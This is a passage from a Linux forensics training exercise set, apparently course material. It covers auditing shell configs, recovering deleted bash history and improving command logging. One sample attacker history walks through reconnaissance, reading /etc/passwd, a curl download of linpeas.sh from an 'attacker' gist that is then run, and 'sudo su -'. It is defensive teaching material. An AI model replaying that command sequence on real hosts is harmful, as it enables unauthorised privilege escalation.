[!] Cron reference found:\"\n      grep -E \"crontab|cron\" \"$config\" | sed 's/^/      /'\n    fi\n    \n    echo \"\"\n  fi\ndone\n\necho \"[*] Audit complete\"\n```\n\n**Usage**:\n```bash\nsudo ./audit_shell_configs.sh suspicious_user\n```\n\n---\n\n## Exercise 6: Real-World Attack Pattern Recognition\n\n**Practice identifying attack stages from history**:\n\n**Sample .bash_history content**:\n```\nwhoami\nid\nuname -a\ncat /etc/issue\nls -la /home\ncat /etc/passwd\ngrep -E \"1000|0\" /etc/passwd\nps aux | grep root\nfind / -perm -4000 -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null\ncurl https://gist.githubusercontent.com/attacker/linpeas.sh -o /tmp/linpeas.sh\nbash /tmp/linpeas.sh > /tmp/linpeas_output.txt\ncat /tmp/linpeas_output.txt | grep -i \"sudo\"\nsudo su -\n```\n\n**Forensic analysis** (identify attack stages):\n\n1. **Initial Access** (not shown in history - likely via web exploit)\n\n2. **Reconnaissance**:\n   ```\n   whoami              ‚Üê Who am I?\n   id                  ‚Üê What groups?\n   uname -a            ‚Üê What OS/kernel?\n   cat /etc/issue      ‚Üê OS version\n   ls -la /home        ‚Üê Other users?\n   cat /etc/passwd     ‚Üê All accounts?\n   grep -E \"1000|0\" /etc/passwd  ‚Üê Admins and normal users\n   ps aux | grep root  ‚Üê What's running as root?\n   ```\n\n3. **Privilege Escalation Enumeration**:\n   ```\n   find / -perm -4000 -type f 2>/dev/null   ‚Üê SUID binaries\n   find / -writable -type d 2>/dev/null     ‚Üê World-writable directories\n   ```\n\n4. **Tool Download**:\n   ```\n   curl https://gist.githubusercontent.com/attacker/linpeas.sh -o /tmp/linpeas.sh\n   bash /tmp/linpeas.sh > /tmp/linpeas_output.txt\n   ```\n   LinPEAS = privilege escalation scanner\n\n5. **Exploitation**:\n   ```\n   cat /tmp/linpeas_output.txt | grep -i \"sudo\"\n   sudo su -  ‚Üê Successfully escalated to root!\n   ```\n\n**Timeline**: ~15-30 minutes from initial access to root (typical)\n\n**Next steps**: Check root's history for post-exploitation activity\n\n---\n\n## Exercise 7: Recovering Deleted History\n\n**Scenario**: Attacker ran `rm ~/.bash_history` but you suspect commands may be recoverable.\n\n**Technique 1: Check for in-memory history (if session still active)**\n```bash\n# If attacker's session still running:\nsudo ps aux | grep bash\n# Note PID of attacker's bash process\n\n# Dump process memory\nsudo gcore <PID>\n\n# Extract strings\nstrings core.<PID> | grep -E \"(wget|curl|nc|bash)\" > recovered_commands.txt\n```\n\n**Technique 2: File carving from disk**\n```bash\n# Unmount or remount read-only first!\nsudo mount -o remount,ro /home\n\n# Use grep to search raw disk\nsudo grep -a -B 5 -A 5 \"wget.*malicious\" /dev/sda1 > carved_history.txt\n\n# Or use specialized tools\nsudo foremost -i /dev/sda1 -o /forensics/carved/\nsudo strings /dev/sda1 | grep -E \"^[a-z]{2,} \" > possible_commands.txt\n```\n\n**Technique 3: Check for backup copies**\n```bash\n# Some backup solutions copy user files\nfind /var/backups -name \"*history*\" 2>/dev/null\nfind /var/cache -name \"*history*\" 2>/dev/null\n\n# Check for shadow copies (if LVM snapshots exist)\nlvs  # List logical volumes\nsudo mount /dev/vg0/snapshot /mnt/snapshot\ncat /mnt/snapshot/home/user/.bash_history\n```\n\n**Technique 4: Check shell's exit append behavior**\n```bash\n# If histappend was enabled, history might be in rotated logs\n# Some systems backup .bash_history on rotation\nfind /home/user -name \".bash_history*\" 2>/dev/null\nls -la /home/user/.bash_history.*\n```\n\n---\n\n## Exercise 8: Setting Up Better History Logging\n\n**Implement comprehensive history logging for future forensics**:\n\n**Method 1: Enhanced .bashrc (per-user)**\n```bash\n# Add to /etc/skel/.bashrc (for new users) or existing ~/.bashrc\n\n# Enable timestamps\nexport HISTTIMEFORMAT=\"%F %T \"\n\n# Increase retention\nexport HISTSIZE=50000\nexport HISTFILESIZE=50000\n\n# Append don't overwrite\nshopt -s histappend\n\n# Save after each command (not just on exit)\nexport PROMPT_COMMAND=\"history -a; $PROMPT_COMMAND\"\n\n# Don't ignore anything\nunset HISTCONTROL\n\n# Log to separate file per session\nexport HISTFILE=~/.bash_history.$(date +%Y%m%d_%H%M%S)_$$\n```\n\n**Method 2: System-wide logging with auditd**\n```bash\n# Install auditd\nsudo apt install auditd  # Debian/Ubuntu\nsudo yum install audit   # RHEL/CentOS\n\n# Add rule to log all command executions\nsudo auditctl -a always,exit -F arch=b64 -S execve -k commands\n\n# Make persistent\nsudo sh -c 'echo \"-a always,exit -F arch=b64 -S execve -k commands\" >> /etc/audit/rules.d/commands.rules'\n\n# Search audit logs\nsudo ausearch -k commands\nsudo ausearch -k commands -i  # Interpreted format\n```\n\n**Method 3: Real-time logging to syslog**\n```bash\n# Add to /etc/bash.bashrc or ~/.bashrc\nfunction log_command() {\n  logger -p local1.notice -t bash_command \"$(whoami): $(history 1 | sed 's/^[ ]*[0-9]\\+[ ]*//')\"\n}\nexport PROMPT_COMMAND='log_command'\n\n# Commands now logged to /var/log/syslog\n# Survives history clearing!\n```\n\n**Verify it works**:\n```bash\n# Run a test command\necho \"test command logging\"\n\n# Check if logged\nsudo tail /var/log/syslog | grep bash_command\n# Should show: bash_command: username: echo \"test command logging\"\n```\n\n---\n\n## Key Takeaways\n\n‚úÖ **Always check history for ALL users** (including root)\n‚úÖ **Look for anti-forensic indicators** in .bashrc/.bash_profile\n‚úÖ **Cross-reference history with file timestamps** for timeline\n‚úÖ **Search for common attacker patterns** (wget, curl, nc, sudo)\n‚úÖ **Check alternative shells** (zsh, fish, tcsh)\n‚úÖ **Implement better logging** for future incidents\n\nHistory analysis is powerful but has limitations - attackers can evade it. Combine with other forensic artifacts (logs, process accounting, network captures) for complete picture."
      }
    }
  ],
  "tags": [
    "Course: 13Cubed-Investigating Linux Devices"
  ]
}